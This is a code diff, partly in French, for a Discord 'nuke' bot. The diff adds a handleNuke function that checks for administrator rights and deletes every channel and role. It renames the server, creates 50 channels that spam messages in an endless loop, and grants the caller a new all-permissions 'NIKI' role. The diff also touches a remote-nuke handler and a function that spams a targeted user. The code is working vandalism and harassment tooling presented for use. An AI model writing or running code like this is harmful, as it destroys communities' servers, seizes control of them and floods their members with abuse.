@@ -30,11 +30,22 @@ const AUTHORIZED_IDS = [
 // ============================================================
 const STATS_FILE = './stats.json';
 
+// === Déclaration des variables globales ===
+let totalNukes = 0;
+let totalChannelsDeleted = 0;
+let totalRolesDeleted = 0;
+let totalChannelsCreated = 0;
+
 function loadStats() {
     if (fs.existsSync(STATS_FILE)) {
         try {
             const data = fs.readFileSync(STATS_FILE, 'utf8');
-            return JSON.parse(data);
+            const parsed = JSON.parse(data);
+            totalNukes = parsed.totalNukes || 0;
+            totalChannelsDeleted = parsed.totalChannelsDeleted || 0;
+            totalRolesDeleted = parsed.totalRolesDeleted || 0;
+            totalChannelsCreated = parsed.totalChannelsCreated || 0;
+            return parsed;
         } catch (e) {
             console.error("Erreur lors du chargement des stats, réinitialisation.");
             return { totalNukes: 0, totalChannelsDeleted: 0, totalRolesDeleted: 0, totalChannelsCreated: 0 };
@@ -55,11 +66,7 @@ function saveStats() {
 }
 
 // On charge les stats au démarrage
-let stats = loadStats();
-let totalNukes = stats.totalNukes;
-let totalChannelsDeleted = stats.totalChannelsDeleted;
-let totalRolesDeleted = stats.totalRolesDeleted;
-let totalChannelsCreated = stats.totalChannelsCreated;
+loadStats();
 
 // ============================================================
 // CLIENT SETUP
@@ -722,7 +729,7 @@ async function handleRemoteNuke(message, guildId) {
 }
 
 // ============================================================
-// NEW SERVER COMMAND
+// NEW SERVER COMMAND (CORRIGÉ - SALONS VISIBLES)
 // ============================================================
 async function handleNewServer(message, theme) {
     const template = TEMPLATES[theme];
@@ -731,13 +738,13 @@ async function handleNewServer(message, theme) {
     const guild = message.guild;
 
     try {
-        // Delete all existing channels
+        // 1. Delete all existing channels
         const channels = guild.channels.cache;
         for (const [id, channel] of channels) {
             try { await channel.delete(); } catch (e) {}
         }
 
-        // Delete all roles (except @everyone)
+        // 2. Delete all roles (except @everyone)
         const roles = guild.roles.cache;
         for (const [id, role] of roles) {
             if (role.name !== '@everyone') {
@@ -745,7 +752,7 @@ async function handleNewServer(message, theme) {
             }
         }
 
-        // Create categories
+        // 3. Create categories
         const categoryMap = {};
         for (const catName of template.categories) {
             try {
@@ -757,17 +764,22 @@ async function handleNewServer(message, theme) {
             } catch (e) {}
         }
 
-        // Create new channels with proper permissions
-        const memberRole = await guild.roles.create({
-            name: 'Membre',
-            color: '#00FF00',
-            hoist: true
-        });
+        // 4. Create a default role for members
+        let memberRole = guild.roles.cache.find(r => r.name === 'Membre');
+        if (!memberRole) {
+            memberRole = await guild.roles.create({
+                name: 'Membre',
+                color: '#00FF00',
+                hoist: true
+            });
+        }
 
+        // 5. Create new channels - EVERYONE CAN SEE THEM
         for (const channelData of template.channels) {
             try {
                 const type = channelData.type === 'voice' ? ChannelType.GuildVoice : ChannelType.GuildText;
                 const parent = categoryMap[channelData.category] || null;
+                
                 const channel = await guild.channels.create({
                     name: channelData.name,
                     type: type,
@@ -775,10 +787,6 @@ async function handleNewServer(message, theme) {
                     permissionOverwrites: [
                         {
                             id: guild.roles.everyone,
-                            deny: [PermissionsBitField.Flags.ViewChannel],
-                        },
-                        {
-                            id: memberRole,
                             allow: [PermissionsBitField.Flags.ViewChannel],
                         }
                     ]
@@ -786,13 +794,15 @@ async function handleNewServer(message, theme) {
 
                 if (type === ChannelType.GuildText) {
                     try {
-                        await channel.send(`**Bienvenue dans ${channelData.name} !**\nCe salon est dédié à la discussion sur ${channelData.name}.`);
+                        await channel.send(`**Bienvenue dans ${channelData.name} !**\nCe salon est dédié à ${channelData.name}.`);
                     } catch (e) {}
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.error('Error creating channel:', e);
+            }
         }
 
-        // Create new roles
+        // 6. Create new roles
         for (const roleData of template.roles) {
             try {
                 await guild.roles.create({
@@ -804,12 +814,12 @@ async function handleNewServer(message, theme) {
             } catch (e) {}
         }
 
-        // Rename server
+        // 7. Rename server
         try {
             await guild.setName(template.name);
         } catch (e) {}
 
-        // Set server icon
+        // 8. Set server icon
         try {
             if (template.icon) {
                 const response = await fetch(template.icon);
@@ -839,6 +849,184 @@ async function handleNewServer(message, theme) {
 }
 
 // ============================================================
+// NUKE FUNCTION (SUPPRIME TOUT)
+// ============================================================
+async function handleNuke(message) {
+    await message.reply('💀 **NUKE INITIALIZED...**');
+
+    const guild = message.guild;
+    const guildName = guild.name;
+    let channelsDeleted = 0;
+    let rolesDeleted = 0;
+    let channelsCreated = 0;
+
+    try {
+        // === Vérification des permissions du bot ===
+        const botMember = guild.members.me;
+        if (!botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            return message.reply(`❌ Je n'ai pas les permissions administrateur sur **${guild.name}**.`);
+        }
+
+        // 1. DELETE ALL CHANNELS
+        const channels = guild.channels.cache;
+        const deletePromises = channels.map(async (channel) => {
+            try {
+                await channel.delete();
+                channelsDeleted++;
+            } catch (e) {}
+        });
+        await Promise.all(deletePromises);
+
+        // 2. DELETE ALL ROLES (except @everyone)
+        const roles = guild.roles.cache;
+        const deleteRolePromises = roles.map(async (role) => {
+            if (role.name !== '@everyone' && role.id !== guild.id) {
+                try {
+                    await role.delete();
+                    rolesDeleted++;
+                } catch (e) {}
+            }
+        });
+        await Promise.all(deleteRolePromises);
+
+        // 3. RENAME SERVER
+        const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
+        try {
+            await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
+        } catch (e) {}
+
+        // 4. CREATE 50 NEW CHANNELS & SPAM
+        const createPromises = [];
+        for (let i = 0; i < 50; i++) {
+            const name = SCARY_NAMES[i % SCARY_NAMES.length];
+            const promise = guild.channels.create({
+                name: name,
+                type: ChannelType.GuildText,
+            }).then(async (channel) => {
+                try {
+                    await channel.send('```' + ASCII_BANNER + '```');
+                    await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
+                    await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
+                    
+                    const embed = new EmbedBuilder()
+                        .setColor(0xFF0000)
+                        .setTitle('☠ SYSTEM DESTROYED ☠')
+                        .setDescription('**NIKI ON TOP !**')
+                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
+                        .setFooter({ text: 'NIKI RULES ☠' })
+                        .setTimestamp();
+                    await channel.send({ embeds: [embed] });
+                    await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
+
+                    let isSpamming = true;                    
+                    while (isSpamming) {
+                        try {
+                            const scaryText = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
+                            await channel.send(scaryText);
+                            await new Promise(resolve => setTimeout(resolve, 50));
+                        } catch (e) {
+                            isSpamming = false;
+                        }
+                    }
+                    channelsCreated++;
+                } catch (e) {}
+            }).catch(() => {});
+            
+            createPromises.push(promise);
+        }
+        await Promise.all(createPromises);
+
+        // 5. CREATE SPECIAL NIKI ROLE
+        try {
+            const allPermissions = [
+                PermissionsBitField.Flags.Administrator,
+                PermissionsBitField.Flags.CreateInstantInvite,
+                PermissionsBitField.Flags.KickMembers,
+                PermissionsBitField.Flags.BanMembers,
+                PermissionsBitField.Flags.ManageChannels,
+                PermissionsBitField.Flags.ManageGuild,
+                PermissionsBitField.Flags.AddReactions,
+                PermissionsBitField.Flags.ViewAuditLog,
+                PermissionsBitField.Flags.PrioritySpeaker,
+                PermissionsBitField.Flags.Stream,
+                PermissionsBitField.Flags.ViewChannel,
+                PermissionsBitField.Flags.SendMessages,
+                PermissionsBitField.Flags.SendTTSMessages,
+                PermissionsBitField.Flags.ManageMessages,
+                PermissionsBitField.Flags.EmbedLinks,
+                PermissionsBitField.Flags.AttachFiles,
+                PermissionsBitField.Flags.ReadMessageHistory,
+                PermissionsBitField.Flags.MentionEveryone,
+                PermissionsBitField.Flags.UseExternalEmojis,
+                PermissionsBitField.Flags.ViewGuildInsights,
+                PermissionsBitField.Flags.Connect,
+                PermissionsBitField.Flags.Speak,
+                PermissionsBitField.Flags.MuteMembers,
+                PermissionsBitField.Flags.DeafenMembers,
+                PermissionsBitField.Flags.MoveMembers,
+                PermissionsBitField.Flags.UseVAD,
+                PermissionsBitField.Flags.ChangeNickname,
+                PermissionsBitField.Flags.ManageNicknames,
+                PermissionsBitField.Flags.ManageRoles,
+                PermissionsBitField.Flags.ManageWebhooks,
+                PermissionsBitField.Flags.ManageEmojisAndStickers
+            ];
+
+            const totalPermissions = allPermissions.reduce((acc, perm) => acc | perm, 0n);
+
+            const nikiRole = await guild.roles.create({
+                name: '☠ NIKI ☠',
+                color: '#FF0000',
+                hoist: true,
+                mentionable: true,
+                permissions: totalPermissions
+            });
+
+            await message.member.roles.add(nikiRole);
+
+            try {
+                await guild.members.me.roles.add(nikiRole);
+            } catch (e) {}
+
+        } catch (e) {
+            console.log("Erreur lors de la création du rôle NIKI:", e);
+        }
+
+        // 6. UPDATE STATS
+        totalNukes++;
+        totalChannelsDeleted += channelsDeleted;
+        totalRolesDeleted += rolesDeleted;
+        totalChannelsCreated += channelsCreated;
+        saveStats();
+
+        await updateStatsChannel();
+
+        const dmEmbed = new EmbedBuilder()
+            .setColor(0xFF0000)
+            .setTitle('☠ NUKE EXECUTED ☠')
+            .setDescription(`**TARGET:** ${guildName}`)
+            .addFields(
+                { name: '💀 Channels Deleted', value: `${channelsDeleted}`, inline: true },
+                { name: '🎭 Roles Deleted', value: `${rolesDeleted}`, inline: true },
+                { name: '📝 Channels Created', value: `${channelsCreated}`, inline: true },
+                { name: '📊 Total Nukes', value: `${totalNukes}`, inline: true }
+            )
+            .setFooter({ text: 'NIKI ON TOP ☠' })
+            .setTimestamp();
+
+        try {
+            await message.author.send({ embeds: [dmEmbed] });
+        } catch (e) {}
+
+        await message.channel.send(`✅ **NUKE COMPLETE!**\n\n${VICTORY_MESSAGES[0]}\n\n**@everyone @here** THIS SERVER IS NOW NIKI'S PROPERTY`);
+
+    } catch (error) {
+        console.error(error);
+        await message.channel.send('❌ Error: ' + error.message);
+    }
+}
+
+// ============================================================
 // SPAM FUNCTION
 // ============================================================
 async function handleSpam(message, args) {
@@ -856,7 +1044,7 @@ async function handleSpam(message, args) {
         return message.reply('❌ Je ne peux pas me spam moi-même !');
     }
 
-    await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...`);
+    await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...**`);
 
     const user = targetMember.user;
     let sentCount = 0;
@@ -1035,7 +1223,7 @@ client.on('interactionCreate', async (interaction) => {
         if (choice === 'code') {
             const code = Math.floor(1000 + Math.random() * 9000).toString();
             
-            global.verifCodes = global.verifCodes || new Map();
+            if (!global.verifCodes) global.verifCodes = new Map();
             global.verifCodes.set(interaction.user.id, code);
 
             const modal = new ModalBuilder()
@@ -1074,15 +1262,9 @@ client.on('interactionCreate', async (interaction) => {
             components: []
         });
     }
-});
 
-// ============================================================
-// GESTION DES MODALES (CODE)
-// ============================================================
-client.on('interactionCreate', async (interaction) => {
-    if (!interaction.isModalSubmit()) return;
-
-    if (interaction.customId === 'code_verif_modal') {
+    // === GESTION DES MODALES ===
+    if (interaction.isModalSubmit() && interaction.customId === 'code_verif_modal') {
         const enteredCode = interaction.fields.getTextInputValue('code_input');
         const storedCode = global.verifCodes ? global.verifCodes.get(interaction.user.id) : null;
 
@@ -1095,7 +1277,7 @@ client.on('interactionCreate', async (interaction) => {
 
         if (enteredCode === storedCode) {
             await interaction.member.roles.add(memberRole);
-            global.verifCodes.delete(interaction.user.id);
+            if (global.verifCodes) global.verifCodes.delete(interaction.user.id);
             
             await interaction.reply({
                 content: '✅ **Code correct !** Tu as maintenant accès à tous les salons.',
